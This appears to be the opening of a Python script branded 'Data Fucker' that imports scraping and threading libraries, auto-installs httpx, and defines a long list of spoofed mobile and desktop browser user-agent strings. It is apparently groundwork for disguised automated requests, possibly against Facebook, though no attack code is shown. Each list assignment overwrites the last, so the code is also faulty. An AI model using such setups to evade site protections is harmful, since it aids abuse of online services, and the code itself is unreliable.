#Sc Made By Devil
#Bot By SoHel
#Data Fucker
#Language Python-3.....utf-8
import os 
#os.system("pkg install sox -y")
#os.system("play op.mp3")
#os.system("pkg install espeak")
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
import requests,zlib,platform
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
try:
    import httpx
except:
    print("\n[!?] Installing Httpx...\n")
    os.system("pip install httpx")
    import httpx
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Primo N5 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; V2111 Build/SP1A.210812.003_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; M2101K7BI Build/RP1A.200720.011; wv) AppleWebKit/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Redmi Note 9S Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Primo N5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; V2203 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER",]
ua = ["Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0",]
ua = ["Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",]
ua = ["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",]
ua = ["Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.0; Trident/7.0; .NET CLR 4.3.36053.0)",]
ua = ["Mozilla/5.0 (Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36 OPR/40.0.2207.0 OMI/4.9.0.237.DOM3.217 Model/Vestel-MB130 VSTVB MB100 HbbTV/1.2.1 (; VESTEL; MB130; 3.62.25.1; _TV_G10_2017;) SmartTvA/3.0.0",]
ua = ["Mozilla/5.0 (Linux; Android 5.0.2; Letv X600 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 5.1; m2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 5.1; m2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 261.0.0.18.106 (iPhone12,1; iOS 16_5; ru_RU; ru-RU; scale=2.00; 828x1792; 418330231)",]
ua = ["Mozilla/5.0 (Linux; Android 5.1; m2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A Build/HUAWEIWAS-LX1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/371.0.0.24.109;]",]
ua = ["Mozilla/5.0 (Linux; Android 12; T810H Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]",]
ua = ["Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/30.0.812.0 Safari/536.0.2",]
ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v935773485004556607 t1290701426861666471 athf552e454 altpriv cvcv=2 smf=0",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]",]
ua = ["Mozilla/5.0 (Linux; Android 10; JSN-L42 Build/HONORJSN-L42; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 5.1; m2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4972.0 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; 5059D_RU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1537.0 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; CPH2089) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/538.1.1 (KHTML, like Gecko) Chrome/23.0.819.0 Safari/538.1.1",]
ua = ["Mozilla/5.0 (Linux; Android 11; M2103K19G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]",]
ua = ["Mozilla/5.0 (Linux; Android 4.2.2; GT-P5100 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 YaBrowser/15.12.2.6773.01 Yowser/2.5.2 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; NE2213) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; VCE-AL00 Build/HUAWEIVCE-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 9; VCE-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; vivo X21A Build/PKQ1.180819.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 9; VOG-L29 Build/HUAWEIVOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 9; YAL-L21 Build/HUAWEIYAL-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 9; YAL-L21 Build/HUAWEIYAL-L61) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 9; YAL-L21 Build/HUAWEIYAL-L61) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 9; YAL-L41 Build/HUAWEIYAL-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 9; ZB602KL Build/PKQ1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.89 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 9; ZB633KL Build/WW_Phone-201905221734) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; ZB633KL Build/WW_Phone-201905221734) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 9; ZB633KL Build/WW_Phone-201905221734) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 9; ZB633KL Build/WW_Phone-201905221734) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; Android 9; ZE620KL Build/PPR1.180610.009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 10; PCT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 YaBrowser/20.2.2.127.00 Yptp/1.62 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 6.0; BLN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 YaBrowser/19.12.1.121.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 6.0; Boost3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.2.90.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 6.0; ZTE BLADE V7 PLUS) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.7.115.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 6.0.1; ASUS_Z010DD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 YaBrowser/19.9.3.116.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 6.0.1; Redmi 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 YaBrowser/20.2.4.136.00 Yptp/1.31 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 7.0; JMM-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 YaBrowser/20.2.0.215.00 Yptp/1.31 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 7.0; MI 5s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 YaBrowser/19.9.6.88.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 7.0; MI 5s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.3.139.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 7.1.1; BV9000Pro-F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 YaBrowser/19.12.1.121.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 8.0.0; LLD-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 YaBrowser/19.9.6.88.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 8.0.0; SM-A720F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 YaBrowser/20.2.0.215.00 Yptp/1.62 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 8.0.0; SM-G935S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.4.97.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 8.0.0; SM-G935S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 YaBrowser/19.12.4.87.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 8.0.0; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 YaBrowser/19.9.6.88.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 8.0.0; STF-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 YaBrowser/20.2.1.120.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 8.0.0; ZE552KL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 YaBrowser/20.8.1.71.00 SA/3 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 8.1.0; ASUS_X00LDA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 YaBrowser/19.12.1.121.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 8.1.0; BKK-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 YaBrowser/20.2.2.121.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 8.1.0; Nokia 3.1 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 YaBrowser/19.9.6.88.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 8.1.0; X19) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 YaBrowser/19.12.0.250.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 9; CPH1979) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 YaBrowser/19.12.4.87.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 9; FLA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 YaBrowser/20.11.1.88.00 SA/3 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 9; H4113) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.6.137.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 9; LLD-L31) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 YaBrowser/19.12.2.152.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 9; MI 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 YaApp_Android/10.39 YaSearchBrowser/10.39 BroPP/1.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 YaBrowser/20.2.4.139.00 Yptp/1.31 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 9; RMX1821) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.4.97.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 9; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 YaBrowser/19.12.1.71.00 (alpha) Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm_64; Android 9; STK-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 YaApp_Android/20.83.0 YaSearchBrowser/20.83.0 BroPP/1.0 SA/1 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm; Android 10; BMH-AN10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 YaApp_Android/20.111.1 YaSearchBrowser/20.111.1 BroPP/1.0 SA/3 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm; Android 5.1.1; C6903) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.5.2.00 (alpha) Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm; Android 5.1.1; C6903) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 YaBrowser/19.12.2.106.00 (alpha) Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm; Android 6.0; LG-K350) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 YaBrowser/20.2.5.131.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm; Android 6.0.1; D6633) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.7.115.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm; Android 6.0.1; D6633) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 YaBrowser/19.9.6.88.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm; Android 7.0; SM-A510F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 YaBrowser/19.12.2.152.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm; Android 8.1.0; SM-J530FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 YaBrowser/20.2.0.215.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm; Android 8.1.0; SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.3.91.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm; Android 9; SM-A600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 YaBrowser/20.2.4.153.00 Mobile SA/1 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm; Android 9; SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.7.111.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; arm; Android 9; SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 YaBrowser/19.10.0.234.00 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; Lenovo P780_ROW Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",]
ua = ["Mozilla/5.0 (Linux; U; Android 5.0.2; en-US; PSP3530DUO Build/LRX22L) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.10.0.796 U3/0.8.0 Mobile Safari/534.30",]
ua = ["Mozilla/5.0 (Linux; U; Android 5.1; en-US; ZTE BLADE L0510 Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30",]
ua = ["Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; SM-G5500 Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; SM-G800F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.0.0.1088 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; SM-J320F Build/LMY47V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30",]
ua = ["Mozilla/5.0 (Linux; U; Android 6.0; en-US; F3311 Build/37.0.A.2.252) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.5.5.1111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 6.0; en-US; Lenovo A2016a40 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.9.2.1143 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 6.0; en-US; LG-K350 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/534.30",]
ua = ["Mozilla/5.0 (Linux; U; Android 6.0.1; en-us; Redmi 4 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; SM-J510FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.11.1.1197 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; ZTE Z10 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.9.3.1144 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 6.0.1; Redmi Note 3 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; U; Android 7.0; en-US; DLI-TL20 Build/HONORDLI-TL20) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.5.0.1015 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 7.0; en-US; JMM-L22 Build/HUAWEIJMM-L22) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.0.1187 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 7.0; en-US; JMM-L22 Build/HUAWEIJMM-L22) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.8.0.1120 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 7.0; en-us; Redmi Note 4X Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36",] 
ua = ["Mozilla/5.0 (Linux; U; Android 7.0; en-US; S110 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.13.2.1208 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 7.0; en-US; S60 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.9.5.1146 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-A510F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.2.1164 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; AUM-L41 Build/HONORAUM-L41) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.9.0.1141 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; MI 6 Build/OPR1.170623.027) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.8.5.1121 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; PRA-LX1 Build/HONORPRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.14.0.1221 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; SM-A600FN Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.11.8.1186 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; SM-A605FN Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.9.5.1146 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; SM-A920F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.0.1187 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; SM-G930F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.5.8.1112 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; SM-G950F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.9.2.1143 Mobile Safari/537.36",]
